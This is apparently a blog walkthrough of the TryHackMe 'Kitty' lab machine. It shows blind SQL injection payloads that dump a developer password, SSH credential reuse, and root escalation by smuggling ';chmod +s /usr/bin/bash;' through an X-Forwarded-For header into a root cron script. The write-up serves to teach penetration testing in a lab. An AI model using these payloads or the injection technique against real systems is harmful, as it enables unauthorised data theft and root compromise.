---
title: CTF Walkthrough for TryHackMe Machine Kitty
date: 2024-10-20 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [TryHackMe, Writeup, SQLi]   
image:
  path: /assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/box-kitty.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Kitty a TryHackMe machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: Kitty<br>
Difficulty: Medium<br>
Operating System: Linux<br>
Machine link: [Kitty](https://tryhackme.com/r/room/kitty)<br>
### Tools used
1) Nmap<br>
2) Zaproxy<br>

## Reconnaissance

We will start by performing a service scan on the target to enumerate the services running on open ports.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Kitty/Scans/Service]
└─$ nmap -n -sC -sV 10.10.27.12 -oA service-scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 17:57 BST
Nmap scan report for 10.10.27.12
Host is up (0.082s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b0:c5:69:e6:dd:6b:81:0c:da:32:be:41:e3:5b:97:87 (RSA)
|   256 6c:65:ad:87:08:7a:3e:4c:7d:ea:3a:30:76:4d:04:16 (ECDSA)
|_  256 2d:57:1d:56:f6:56:52:29:ea:aa:da:33:b2:77:2c:9c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.42 seconds
```

We can see that the target runs an SSH and a web server. Let's visit this web application to see its functionality.
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/1-browse.png)

We are greeted with a login page. We can also see an option to sign up for the web application and use this account to log in.
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/signup.png)
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/login.png)
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/welcome-1.png)

After logging in, we are greeted with a welcome message. This does not look interesting so let's create and test the web application for SQL injection vulnerability.
*NB: In this assessment, I created several users while testing for username enumeration including the user admin used below.*
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/sqli-detected.png)

We see that the web application detects our SQL injection payload. Assuming the query used to fetch users' data in this web application is the common query `SELECT * FROM table_name WHERE username_column = INPUT AND password_column = INPUT`, we can attempt to enter the username with the comment sign.
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/sqli-indentify.png)

## Exploitation

We successfully logged into the web application. We can notice a change in the content length of the HTTP response header when a successful query is made. We can use this content length as a validation for a boolean-based SQL injection attack. For demonstration purposes, we will walk through this boolean-based SQL injection attack step by step. Since the web application uses an Apache2 web server and PHP, we can assume it uses the LAMP stack hence it uses a MySQL database at the backend.<br>
After identifying the SQL injection vulnerability and the database used we can start enumerating the DBMS. We will start by enumerating non-default databases in the DBMS. To do this we will use the payload below as the username.<br>
```mysql
admin' AND (SELECT SUBSTRING(schema_name,1,1) FROM information_schema.schemata LIMIT 3,1)='i'-- -
```
We will fuzz the web application with this payload by changing the first digit in the SUBSTRING function and the letter used for equality. The LIMIT keyword will make the query return only one entry.
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/db-enum.png)
We will enumerate two non-default databases in the DBMS named `mywebsite` and `devsite`.

The `devsite` database looks interesting because it may contain development information. Let's enumerate the tables in this database. We will use the payload below.
```mysql
admin' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema='devsite' LIMIT 0,1)='a'-- -
```
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/table-enum.png)

We enumerated an interesting table named `siteusers`.

Since this is the only table in the `devsite` database, we can use the query below to enumerate the available columns in the table.
```mysql
admin' AND (SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns WHERE table_schema='devsite' LIMIT 0,1)='a'-- -
```
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/column_enum.png)
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/column_enum-1.png)
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/column_enum-2.png)

We enumerated three columns which are `id`, `username`, and `password`. We can now dump the content of the username and password columns using the payloads below.
```mysql 
admin' AND (SELECT SUBSTRING(username,1,1) FROM devsite.siteusers LIMIT 0,1)='a'-- -

admin' AND (SELECT SUBSTRING(password COLLATE utf8mb4_bin,1,1) FROM devsite.siteusers WHERE username='kitty')='a'-- -
```
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/data_enum.png)
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/data_enum-1.png)

This dumps the password and the username kitty. Since this dump comes from the `devsite` database and we know that developers often have SSH access to servers, let's try to log into SSH using the same password.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Kitty/Scans/Web]
└─$ ssh kitty@10.10.27.12 
kitty@10.10.27.12's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-139-generic x86_64)

<SNIP>
Last login: Tue Nov  8 01:59:23 2022 from 10.0.2.26
kitty@kitty:~$ ls
user.txt
```

We see that we logged in as the user Kitty and we can read the user flag. This proves to us that this developer uses the same password across different platforms.

## Post Exploitation

After logging in we will notice that a second web application is listening internally on port 8080.
```bash
kitty@kitty:~$ ss -lnt
State                 Recv-Q                Send-Q                               Local Address:Port                                  Peer Address:Port                Process                
LISTEN                0                     70                                       127.0.0.1:33060                                      0.0.0.0:*                                          
LISTEN                0                     151                                      127.0.0.1:3306                                       0.0.0.0:*                                          
LISTEN                0                     511                                      127.0.0.1:8080                                       0.0.0.0:*                                          
LISTEN                0                     4096                                 127.0.0.53%lo:53                                         0.0.0.0:*                                          
LISTEN                0                     128                                        0.0.0.0:22                                         0.0.0.0:*                                          
LISTEN                0                     511                                              *:80                                               *:*                                          
LISTEN                0                     128                                           [::]:22                                            [::]:*                                          
kitty@kitty:~$ curl 127.0.0.1:8080
<!DOCTYPE html>
<html lang="en">
<head>
    <SNIP>
</head>
<body>
    <div class="wrapper">
        <SNIP>
    </div>
</body>
</html>
kitty@kitty:~$ 
```

We can access this web application by performing local port forwarding using the SSh service on the target.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Kitty/Scans/Web]
└─$ ssh kitty@10.10.27.12  -L 8080:127.0.0.1:8080
kitty@10.10.27.12's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-139-generic x86_64)
<SNIP>
kitty@kitty:~$ 
```
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/internal-server.png)

This looks like the web application we tested above. We can transfer `pspy64` to the target to enumerate processes running on the target.
```bash
kitty@kitty:/tmp$ nc -lvnp 9999 > pspy64 ; chmod 755 pspy64
Listening on 0.0.0.0 9999
```
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Kitty/Scans/Web]
└─$ nc -q 0 10.10.27.12 9999 < /usr/share/pspy/pspy64
```

After transferring `pspy64`, we can run it as shown below.
```bash
kitty@kitty:/tmp$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
<SNIP>
2024/10/21 20:27:49 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2024/10/21 20:28:01 CMD: UID=0     PID=4845   | /usr/sbin/CRON -f 
2024/10/21 20:28:01 CMD: UID=0     PID=4848   | /usr/bin/bash /opt/log_checker.sh 
2024/10/21 20:28:01 CMD: UID=0     PID=4847   | /bin/sh -c /usr/bin/bash /opt/log_checker.sh 
2024/10/21 20:28:01 CMD: UID=0     PID=4849   | cat /dev/null 
2024/10/21 20:29:01 CMD: UID=0     PID=4850   | /usr/sbin/CRON -f 
2024/10/21 20:29:01 CMD: UID=0     PID=4851   | 
2024/10/21 20:29:01 CMD: UID=0     PID=4852   | /bin/sh -c /usr/bin/bash /opt/log_checker.sh 
2024/10/21 20:29:01 CMD: UID=0     PID=4853   | /usr/bin/bash /opt/log_checker.sh 
<SNIP>
```

We see that a root process runs a shell script called `log_checker.sh`. Let's examine this script.
```bash
kitty@kitty:/tmp$ ls -l /opt/log_checker.sh
-rw-r--r-- 1 root root 152 Feb 25  2023 /opt/log_checker.sh
kitty@kitty:/tmp$ cat /opt/log_checker.sh
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged
```

This script fetches the content of the `/var/www/development/logged` file, adds it to a string, executes the string using bash, and finally empties the file. Since the content of the file is added to the string before executing the string we can poison this execution by adding `;` which will end the first command and execute the one that follows. We can go to the `/var/www/development` directory and check how this file is generated.
```bash
kitty@kitty:/var/www/development$ grep -Ri 'logged' ./
./welcome.php:// Check if the user is logged in, if not then redirect him to login page
./welcome.php:if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
./index.php:// Check if the user is already logged in, if yes then redirect him to welcome page
./index.php:if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
./index.php:            echo 'SQL Injection detected. This incident will be logged!';
./index.php:            file_put_contents("/var/www/development/logged", $ip);
./index.php:            echo 'SQL Injection detected. This incident will be logged!';
./index.php:            file_put_contents("/var/www/development/logged", $ip);
./index.php:    $_SESSION["loggedin"] = true;

kitty@kitty:/var/www/development$ grep -Ri '$ip' ./
./index.php:            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
./index.php:            $ip .= "\n";
./index.php:            file_put_contents("/var/www/development/logged", $ip);
./index.php:            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
./index.php:            $ip .= "\n";
./index.php:            file_put_contents("/var/www/development/logged", $ip);
```

We see that this file stores the IP address of the machine that tries an SQL injection attack against the application. This IP address is gotten from the `X-Forwarded-For` HTTP header by using `$_SERVER['HTTP_X_FORWARDED_FOR']` in PHP. Unfortunately, the normal HTTP POST request does not include this header.
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/root-1.png)

We can manually add this header with a normal value to check if the logging functionality of the application works.
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/root-2.png)
```bash
kitty@kitty:/var/www/development$ cat logged 
127.0.0.1
```

The IP address in the `X-Forwarded-For` HTTP header was logged successfully by the application. Now let's try to add a command that will poison the string executed by the cron job.
![](/assets/img/posts/walthrough/tryhackme/2024-10-22-kitty/root.png)
```bash
kitty@kitty:/var/www/development$ cat logged 
;chmod +s /usr/bin/bash;
kitty@kitty:/var/www/development$ ls /bin/bash -l
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

We see that our code was executed and the SUID bit was set on the bash binary. We can use this binary to access a root shell and read the second flag.
```bash
kitty@kitty:/var/www/development$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# ls /root
logged  root.txt  snap
```

## Conclusion

Congratulations! In this walkthrough, you have exploited an SQL injection vulnerability manually to access a developer credential stored in the database that you used to SSH to the target. Finally, obtained root on the target by poisoning a a string executed during the backup process of the application logs. This machine was designed to show how inconsistent input validation when appending input to SQL queries could seriously impact an organisation's security posture. Thanks for following up on this walkthrough.
